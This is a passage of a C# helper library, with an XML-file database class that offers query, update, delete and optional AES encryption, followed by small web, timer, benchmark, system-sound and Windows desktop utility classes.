            string newInnerXml = Serialize(Value);
            foreach (XmlNode Parent in Elements)
            {
                XmlNode NewElement = XmlDoc.CreateNode(XmlNodeType.Element, Notation[^1], null);
                NewElement.InnerXml = newInnerXml;
                Parent.AppendChild(NewElement);
            }
            // Add Elements

            Write(XmlDoc.InnerXml);
        }
        public void AddToAll(string Name) { AddToAll(Name, null); }

        #endregion

        // If Exists Change First Found
        #region Update

        public void Update<T>(string Name, Func<T, T> Update, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                    // Get Child Elements
                }
                // Add Element To Temp List

                Elements = TempElements;
            }
            // Check Layers And Get Elements

            if (Elements.Count == 0) return;
            // Return If Not Found

            List<XmlNode> SetableElements = new List<XmlNode>();
            if (Predicate is null) SetableElements = Elements;
            else
            {
                string _SerializedName = Serialize<T>(null);
                string _TypeAlias = Regex.Match(_SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                // Get TypeAlias And IsArray

                string _StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
                foreach (XmlNode Element in Elements)
                {
                    string ElementXml = Element.InnerXml;
                    // Get Elements Xml

                    string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                    for (int x = 0; x < 2; x++)
                    {
                        int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                        ElementXml = ElementXml[..Index] + _TypeAlias + ElementXml[(Index + DataType.Length)..];
                    }
                    // Replace Data Types

                    try
                    {
                        T Item = Deserialize<T>(_StartDocument + ElementXml);
                        if (Predicate(Item)) SetableElements.Add(Element);
                        // Add To Setable Element List
                    }
                    catch { }
                }
            }
            // Remove If Not True For Predicate

            if (SetableElements.Count == 0) return;
            // Return If Not Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray

            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in SetableElements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    Item = Update(Item);
                    Element.InnerXml = Serialize(Item);
                    break;
                }
                catch { }
            }
            // Update All Elements

            Write(XmlDoc.InnerXml);
        }
        public void Update<T>(string Name, T NewInstance, T Instance) { Update<T>(Name, Object => NewInstance, Object => Object.Equals(Instance)); }
        public void Update<T>(string Name, Func<T, T> Update, T Instance) { Update<T>(Name, Update, Object => Object.Equals(Instance)); }
        public void Update<T>(string Name, T NewInstance, Predicate<T> Predicate) { Update(Name, Object => NewInstance, Predicate); }

        public void Update<T>(string Name, T NewInstance) { Update<T>(Name, Object => NewInstance, null); }

        public void Update<T>(string Name, Func<T, T> Update) { Update<T>(Name, Object => Update(Object), null); }

        #endregion
        // If Exists, Change All
        #region UpdateAll

        public void UpdateAll<T>(string Name, Func<T, T> Update, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                    // Get Child Elements
                }
                // Add Element To Temp List

                Elements = TempElements;
            }
            // Check Layers And Get Elements

            if (Elements.Count == 0) return;
            // Return If Not Found


            List<XmlNode> SetableElements = new List<XmlNode>();
            if (Predicate is null) SetableElements = Elements;
            else
            {
                string _SerializedName = Serialize<T>(null);
                string _TypeAlias = Regex.Match(_SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                // Get TypeAlias And IsArray

                string _StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
                foreach (XmlNode Element in Elements)
                {
                    string ElementXml = Element.InnerXml;
                    // Get Elements Xml

                    string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                    for (int x = 0; x < 2; x++)
                    {
                        int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                        ElementXml = ElementXml[..Index] + _TypeAlias + ElementXml[(Index + DataType.Length)..];
                    }
                    // Replace Data Types

                    try
                    {
                        T Item = Deserialize<T>(_StartDocument + ElementXml);
                        if (Predicate(Item)) SetableElements.Add(Element);
                        // Add To Setable Element List
                    }
                    catch { }
                }
            }
            // Remove If Not True For Predicate

            if (SetableElements.Count == 0) return;
            // Return If Not Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray

            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in SetableElements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    Item = Update(Item);
                    Element.InnerXml = Serialize(Item);
                }
                catch { }
            }
            // Update All Elements

            Write(XmlDoc.InnerXml);
        }
        public void UpdateAll<T>(string Name, T NewInstance, T Instance) { UpdateAll<T>(Name, Object => NewInstance, Object => Object.Equals(Instance)); }
        public void UpdateAll<T>(string Name, Func<T, T> Update, T Instance) { UpdateAll<T>(Name, Update, Object => Object.Equals(Instance)); }
        public void UpdateAll<T>(string Name, T NewInstance, Predicate<T> Predicate) { UpdateAll(Name, Object => NewInstance, Predicate); }

        public void UpdateAll<T>(string Name, T NewInstance) { UpdateAll<T>(Name, Object => NewInstance, null); }

        public void UpdateAll<T>(string Name, Func<T, T> Update) { UpdateAll<T>(Name, Object => Update(Object), null); }

        #endregion

        // Check If Element Exists
        #region Exists

        public bool Exists<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements


            if (Elements.Count == 0) return false;
            // Return False If Not Found

            if (Predicate is null) return true;
            // Return True If Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    if (Predicate(Item)) return true;
                    // Return True If Found
                }
                catch { }
                // Add To List
            }

            return false;
        }
        public bool Exists<T>(string Name, T Instance) { return Exists<T>(Name, Object => Object.Equals(Instance)); }
        public bool Exists(string Name) { return Exists<object>(Name, null); }

        #endregion
        // Get Count Of Element
        #region Count

        public int Count<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements


            if (Predicate is null) return Elements.Count;
            // Return True If Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            int Found = 0;
            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    if (Predicate(Item)) Found++;
                    // Add 1 To Found
                }
                catch { }
            }

            return Found;
        }
        public int Count<T>(string Name, T Instance) { return Count<T>(Name, Object => Object.Equals(Instance)); }
        public int Count(string Name) { return Count<object>(Name, null); }

        #endregion

        // If Exists, Delete First Found
        #region Delete

        public void Delete<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements            

            if (Elements.Count == 0) return;
            // Return If Not Found

            if (Predicate is null)
            {
                XmlNode Element = Elements[0];
                Element.ParentNode.RemoveChild(Element);

                Write(XmlDoc.InnerXml);
                return;
            }
            // Delete First If No Predicate


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    if (Predicate(Item))
                    {
                        Element.ParentNode.RemoveChild(Element);
                        break;
                    }
                    // Remove First Element
                }
                catch { }
                // Add To List
            }

            Write(XmlDoc.InnerXml);
        }
        public void Delete<T>(string Name, T Instance) { Delete<T>(Name, Object => Object.Equals(Instance)); }
        public void Delete(string Name) { Delete<object>(Name, null); }

        #endregion
        // If Exists, Delete All
        #region DeleteAll

        public void DeleteAll<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            string Xml = Read();

            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements               

            if (Elements.Count == 0) return;
            // Return If Not Found

            if (Predicate is null)
            {
                foreach (XmlNode Element in Elements)
                    Element.ParentNode.RemoveChild(Element);

                Write(XmlDoc.InnerXml);
                return;
            }
            // Delete First If No Predicate


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    if (Predicate(Item))
                    {
                        Element.ParentNode.RemoveChild(Element);
                    }
                    // Remove First Element
                }
                catch { }
                // Add To List
            }

            Write(XmlDoc.InnerXml);
        }
        public void DeleteAll<T>(string Name, T Instance) { DeleteAll<T>(Name, Object => Object.Equals(Instance)); }
        public void DeleteAll(string Name) { DeleteAll<object>(Name, null); }

        #endregion

        // If Exists, Return First Found
        #region Get

        public T Get<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            int NotationLength = Notation.Length;
            string Xml = Read();


            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements

            if (Elements.Count == 0) return default;
            // Return If Not Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];

            List<T> ItemList = new List<T>();
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    ItemList.Add(Item);
                }
                catch { }
                // Add To List
            }

            if (ItemList.Count == 0) return default;
            // Return If Not Found

            if (Predicate is null) return ItemList.FirstOrDefault();
            return ItemList.FirstOrDefault(new Func<T, bool>(Predicate));
            // Return First
        }
        public T Get<T>(string Name) { return Get<T>(Name, null); }

        #endregion
        // If Exists, Return All As Array
        #region GetAll

        public T[] GetAll<T>(string Name, Predicate<T> Predicate)
        {
            string[] Notation = Name.Split('.');
            int NotationLength = Notation.Length;
            string Xml = Read();


            XmlDocument XmlDoc = new XmlDocument();
            XmlDoc.LoadXml(Xml);

            List<XmlNode> Elements = new List<XmlNode> { XmlDoc.DocumentElement };
            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                List<XmlNode> TempElements = new List<XmlNode>();
                foreach (XmlNode Element in Elements)
                {
                    XmlNodeList ChildNodes = Element.ChildNodes;
                    foreach (XmlNode ChildElement in ChildNodes)
                    {
                        if (ChildElement.Name != Notation[Layer]) continue;

                        TempElements.Add(ChildElement);
                    }
                }
                Elements = TempElements;
            }
            // Check Layers And Get Elements

            if (Elements.Count == 0) return default;
            // Return If Not Found


            string SerializedName = Serialize<T>(null);
            string TypeAlias = Regex.Match(SerializedName, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
            // Get TypeAlias And IsArray


            string StartDocument = Xml[..(Xml.IndexOf("?>") + 2)];

            List<T> ItemList = new List<T>();
            foreach (XmlNode Element in Elements)
            {
                string ElementXml = Element.InnerXml;
                // Get Elements Xml

                string DataType = Regex.Match(ElementXml, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                for (int x = 0; x < 2; x++)
                {
                    int Index = x == 0 ? ElementXml.IndexOf(DataType) : ElementXml.LastIndexOf(DataType);
                    ElementXml = ElementXml[..Index] + TypeAlias + ElementXml[(Index + DataType.Length)..];
                }
                // Replace Data Types

                try
                {
                    T Item = Deserialize<T>(StartDocument + ElementXml);
                    ItemList.Add(Item);
                }
                catch { }
                // Add To List
            }

            if (ItemList.Count == 0) return default;
            // Return If Not Found

            if (Predicate is null) return ItemList.ToArray();
            return ItemList.Where(new Func<T, bool>(Predicate)).ToArray();
            // Return List
        }
        public T[] GetAll<T>(string Name) { return GetAll<T>(Name, null); }

        #endregion



        #region Utilities

        #region Write / Read

        private void Write(string Text)
        {
            Directory.CreateDirectory(new FileInfo(Path).Directory.FullName);
            if (!File.Exists(Path)) using (FileStream FileStream = File.Create(Path)) { };

            using (StreamWriter StreamWriter = new StreamWriter(Path))
                StreamWriter.WriteLine(Encryption ? Encrypt(Text) : Text);
        }

        private string Read()
        {
            if (!File.Exists(Path))
            {
                string Xml;
                using (StringWriter StringWriter = new StringWriter())
                {
                    using (XmlWriter XmlWriter = System.Xml.XmlWriter.Create(StringWriter))
                    {
                        XmlWriter.WriteStartDocument();

                        XmlWriter.WriteStartElement("Database");
                        XmlWriter.WriteEndElement();
                    }
                    Xml = StringWriter.ToString();
                }
                return Xml;
            }
            // If File Not Exists

            using (StreamReader StreamReader = new StreamReader(Path))
                return Encryption ? Decrypt(StreamReader.ReadToEnd()) : StreamReader.ReadToEnd();
        }

        #endregion

        #region Serialize / Deserialize

        private static string Serialize(object Value, Type Type)
        {
            using (StringWriter StringWriter = new StringWriter())
            {
                XmlSerializerNamespaces Ns = new XmlSerializerNamespaces();
                Ns.Add("S", "S");

                XmlSerializer XmlSerializer = new XmlSerializer(Type);
                XmlSerializer.Serialize(StringWriter, Value, Ns);

                string Serialized = StringWriter.ToString();
                Serialized = Serialized[(Serialized.IndexOf("?>") + 2)..];

                if (!Serialized.Contains("xmlns:S=\"S\""))
                {
                    string Alias = Regex.Match(Serialized, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                    Serialized = Serialized.Insert(Alias.Length + 3, " xmlns:S=\"S\"");
                }

                return Serialized;
            }
        }
        private static string Serialize<T>(object Value) { return Serialize(Value, typeof(T)); }
        private static string Serialize(object Value) { if (Value is null) return string.Empty; return Serialize(Value, Value.GetType()); }

        private static T Deserialize<T>(string Xml)
        {
            using (StringReader StringReader = new StringReader(Xml))
            {
                XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));
                object Item = XmlSerializer.Deserialize(StringReader);

                return (T)Item;
            }
        }

        #endregion

        #region Encrypt / Decrypt

        private string Encrypt(string clearText)
        {
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }
        private string Decrypt(string cipherText)
        {
            cipherText = cipherText.Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                }
            }
            return cipherText;
        }

        #endregion

        #endregion

    }

}

#endregion
#nullable enable warnings




// Internet/HTTP Requests classıyla birleştir

#region => -Web

namespace BekoS
{
    public static class Web
    {

        public static string GetString(string url)
        {
            using HttpClient httpClient = new HttpClient();

            return Encoding.UTF8.GetString(httpClient.GetByteArrayAsync(url).Result);
        }


        public static Image DownloadImage(string url)
        {
            using HttpClient httpClient = new HttpClient();

            return Image.FromStream(httpClient.GetStreamAsync(url).Result);
        }




    }
}

#endregion


#region => -Callback

namespace BekoS
{
    public static class Callback
    {

        #region Set Interval

        public static System.Timers.Timer SetInterval(Action Method, int Interval)
        {
            System.Timers.Timer Timer = new System.Timers.Timer { Interval = Interval };
            Timer.Elapsed += (object? sender, ElapsedEventArgs a) => Method();
            Timer.Start();
            return Timer;
        }


        #endregion

        #region Set Timeout

        public static void SetTimeout(Action Method, int Timeout, bool StopThread)
        {
            if (StopThread) { Thread.Sleep(Timeout); Method(); }
            // Stop Thread
            else
            {
                Task.Delay(Timeout);
                Method();
            }
            // Dont Stop Thread
        }

        public static void SetTimeout(Action Method, int Timeout) { SetTimeout(Method, Timeout, false); }

        #endregion

        #region UI Thread

        public static void UIThread(Action Method, Control Control)
        {
            if (Control.InvokeRequired) Control.Invoke(Method);

            else Method();
        }

        #endregion

    }
}

#endregion


// Develop
// get void as parameter

#region => -Benchmark

namespace BekoS
{
    public class Benchmark
    {

        Stopwatch watch = new Stopwatch();
        public Benchmark()
        {
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            watch.Start();
        }

        public string Finish()
        {
            watch.Stop();

            return "Milliseconds: " + watch.Elapsed.TotalMilliseconds;
        }

    }
}

#endregion


#region => -Sounds

namespace BekoS
{

    public static class Sounds
    {
        private static Sound? _deviceConnect;
        public static Sound DeviceConnect => _deviceConnect ??= new Sound("DeviceConnect");

        private static Sound? _deviceDisconnect;
        public static Sound DeviceDisconnect => _deviceDisconnect ??= new Sound("DeviceDisconnect");

        private static Sound? _deviceFail;
        public static Sound DeviceFail => _deviceFail ??= new Sound("DeviceFail");


        private static Sound? _warning;
        public static Sound Warning => _warning ??= new Sound("SystemExclamation");

        private static Sound? _error;
        public static Sound Error => _error ??= new Sound("SystemHand");


        private static Sound? _mail;
        public static Sound Mail => _mail ??= new Sound("MailBeep");

        private static Sound? _messageNudge;
        public static Sound MessageNudge => _messageNudge ??= new Sound("MessageNudge");

        private static Sound? _default;
        public static Sound Default => _default ??= new Sound("Notification.Default");

        private static Sound? _proximity;
        public static Sound Proximity => _proximity ??= new Sound("Notification.Proximity");

        private static Sound? _proximityConnection;
        public static Sound ProximityConnection => _proximityConnection ??= new Sound("ProximityConnection");

        private static Sound? _reminder;
        public static Sound Reminder => _reminder ??= new Sound("Notification.Reminder");

        private static Sound? _message;
        public static Sound Message => _message ??= new Sound("Notification.SMS");

        private static Sound? _logon;
        public static Sound Logon => _logon ??= new Sound("WindowsLogon");

        private static Sound? _accountControl;
        public static Sound AccountControl => _accountControl ??= new Sound("WindowsUAC");

        private static Sound? _unlock;
        public static Sound Unlock => _unlock ??= new Sound("WindowsUnlock");


        private static Sound? _alarm1;
        public static Sound Alarm1 => _alarm1 ??= new Sound("Notification.Looping.Alarm");

        private static Sound? _alarm2;
        public static Sound Alarm2 => _alarm2 ??= new Sound("Notification.Looping.Alarm2");

        private static Sound? _alarm3;
        public static Sound Alarm3 => _alarm3 ??= new Sound("Notification.Looping.Alarm3");

        private static Sound? _alarm4;
        public static Sound Alarm4 => _alarm4 ??= new Sound("Notification.Looping.Alarm4");

        private static Sound? _alarm5;
        public static Sound Alarm5 => _alarm5 ??= new Sound("Notification.Looping.Alarm5");

        private static Sound? _alarm6;
        public static Sound Alarm6 => _alarm6 ??= new Sound("Notification.Looping.Alarm6");

        private static Sound? _alarm7;
        public static Sound Alarm7 => _alarm7 ??= new Sound("Notification.Looping.Alarm7");

        private static Sound? _alarm8;
        public static Sound Alarm8 => _alarm8 ??= new Sound("Notification.Looping.Alarm8");

        private static Sound? _alarm9;
        public static Sound Alarm9 => _alarm9 ??= new Sound("Notification.Looping.Alarm9");

        private static Sound? _alarm10;
        public static Sound Alarm10 => _alarm10 ??= new Sound("Notification.Looping.Alarm10");


        private static Sound? _ring1;
        public static Sound Ring1 => _ring1 ??= new Sound("Notification.Looping.Call");

        private static Sound? _ring2;
        public static Sound Ring2 => _ring2 ??= new Sound("Notification.Looping.Call2");

        private static Sound? _ring3;
        public static Sound Ring3 => _ring3 ??= new Sound("Notification.Looping.Call3");

        private static Sound? _ring4;
        public static Sound Ring4 => _ring4 ??= new Sound("Notification.Looping.Call4");

        private static Sound? _ring5;
        public static Sound Ring5 => _ring5 ??= new Sound("Notification.Looping.Call5");

        private static Sound? _ring6;
        public static Sound Ring6 => _ring6 ??= new Sound("Notification.Looping.Call6");

        private static Sound? _ring7;
        public static Sound Ring7 => _ring7 ??= new Sound("Notification.Looping.Call7");

        private static Sound? _ring8;
        public static Sound Ring8 => _ring8 ??= new Sound("Notification.Looping.Call8");

        private static Sound? _ring9;
        public static Sound Ring9 => _ring9 ??= new Sound("Notification.Looping.Call9");

        private static Sound? _ring10;
        public static Sound Ring10 => _ring10 ??= new Sound("Notification.Looping.Call10");
    }

    public class Sound : IDisposable
    {
        public string? SystemName { get; private set; }
        public string? Path { get; private set; }
        public bool IsValid { get; private set; }

        public Sound(string name) => SetSystemSoundInfos(name);

        private void SetSystemSoundInfos(string name)
        {
            var key = $@"AppEvents\Schemes\Apps\.Default\{name}\.Default";
            using var reg = Registry.CurrentUser.OpenSubKey(key);

            Path = reg?.GetValue(string.Empty)?.ToString();
            if (Path is null) return;

            string fileName = new FileInfo(Path).Name;
            SystemName = fileName[..fileName.LastIndexOf(".")];

            IsValid = true;
        }

        private SoundPlayer? _soundPlayer;
        public void Play()
        {
            if (!IsValid) return;

            _soundPlayer ??= new SoundPlayer(Path);
            _soundPlayer?.Play();
        }

        public void PlayLooping()
        {
            if (!IsValid) return;

            _soundPlayer ??= new SoundPlayer(Path);
            _soundPlayer.PlayLooping();
        }

        public void PlaySync()
        {
            if (!IsValid) return;

            _soundPlayer ??= new SoundPlayer(Path);
            _soundPlayer.PlaySync();
        }

        public void Stop()
        {
            if (_soundPlayer is null) return;

            _soundPlayer?.Stop();
            _soundPlayer?.Dispose();
            _soundPlayer = null;
        }

        public void Dispose() => Stop();
    }
}

#endregion


#region => Desktop

public static class Desktop
{
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool IsWindowVisible(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern IntPtr ShowWindow(IntPtr hwnd, int command);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", SetLastError = false)]
    private static extern IntPtr GetDesktopWindow();

    [return: MarshalAs(UnmanagedType.Bool)]
